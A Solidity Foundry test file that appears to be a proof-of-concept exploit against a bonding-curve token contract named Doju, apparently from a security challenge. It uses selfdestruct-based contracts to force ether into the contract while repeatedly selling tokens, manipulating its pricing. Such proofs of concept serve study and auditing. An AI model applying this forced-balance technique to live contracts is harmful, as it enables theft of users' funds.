// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Doju} from "../src/doju/Doju.sol";

contract DojuTest is Test {
    Doju public doju;
    address public user = address(1);

    function setUp() public {
        vm.startPrank(user);
        doju = new Doju();
        vm.deal(user, 1000 ether);
    }

    function testBuyTokens() public {
        uint256 initialBalance = doju.balanceOf(user);

        console.log("token balance", doju.balanceOf(user));
        console.log("user eth balance", address(user).balance);
        console.log("doju eth balance", address(doju).balance);
        console.log(
            "k",
            doju.totalSupply() * doju.totalSupply() - address(doju).balance
        );

        new forceSend{value: 950 ether}(address(doju));
        doju.sellTokens(10 ether, user, type(uint).max);
        new forceSend{value: 850 ether}(address(doju));
        doju.sellTokens(10 ether, user, type(uint).max);
        new forceSend{value: 750 ether}(address(doju));
        doju.sellTokens(10 ether, user, type(uint).max);
        new forceSend{value: 650 ether}(address(doju));
        doju.sellTokens(10 ether, user, type(uint).max);
        new forceSend{value: 550 ether}(address(doju));
        doju.sellTokens(10 ether, user, type(uint).max);
        new forceSend{value: 450 ether}(address(doju));
        doju.sellTokens(10 ether, user, type(uint).max);
        new forceSend{value: 350 ether}(address(doju));
        doju.sellTokens(10 ether, user, type(uint).max);
        new forceSend{value: 250 ether}(address(doju));
        doju.sellTokens(10 ether, user, type(uint).max);
        new forceSend{value: 150 ether}(address(doju));
        doju.sellTokens(10 ether, user, type(uint).max);
        new forceSend{value: 150 ether}(address(doju));
        doju.sellTokens(10 ether, user, type(uint).max);

        console.log("token balance", doju.balanceOf(user));
        console.log("total supply", doju.totalSupply());
        console.log("user eth balance", address(user).balance);
        console.log("doju eth balance", address(doju).balance);
        address(doju).call{value: 100 ether}("");
        console.log("token balance", doju.balanceOf(user));
        console.log("total supply", doju.totalSupply());
        console.log("user eth balance", address(user).balance);
        console.log("doju eth balance", address(doju).balance);

        // uint256 initBalance = doju.balanceOf(user);
        // address(doju).call{value: 100 ether}("");
        // uint256 boughtAmount = doju.balanceOf(user) - initBalance;
        // console.log("token balance", doju.balanceOf(user));
        // console.log("bought amount", boughtAmount);
        // console.log("user eth balance", address(user).balance);
        // console.log("doju eth balance", address(doju).balance);
        // console.log(
        //     "k",
        //     doju.totalSupply() * doju.totalSupply() - address(doju).balance
        // );

        // console.log("tokensToEth", tokensToEth(boughtAmount));
    }

    // Bonding curve formula to calculate how much ETH to return for given tokens
    function tokensToEth(uint256 tokenAmount) public view returns (uint256) {
        uint256 currentSupply = doju.totalSupply();
        uint256 k = currentSupply * currentSupply;
        uint256 newSupply = currentSupply - tokenAmount;
        uint256 newK = newSupply * newSupply;
        return (k - newK) / (2 * 1e18);
    }

    function findMinTokenAmountToSell(
        uint256 ethAmount
    ) public view returns (uint256) {
        uint256 low = 0;
        uint256 high = doju.totalSupply();
        while (low < high) {
            uint256 mid = (low + high) / 2;
            if (tokensToEth(mid) < ethAmount) {
                low = mid + 1;
            } else {
                high = mid;
            }
        }
        return low - 1;
    }
}

contract forceSend {
    constructor(address to) payable {
        selfdestruct(payable(to));
    }
}
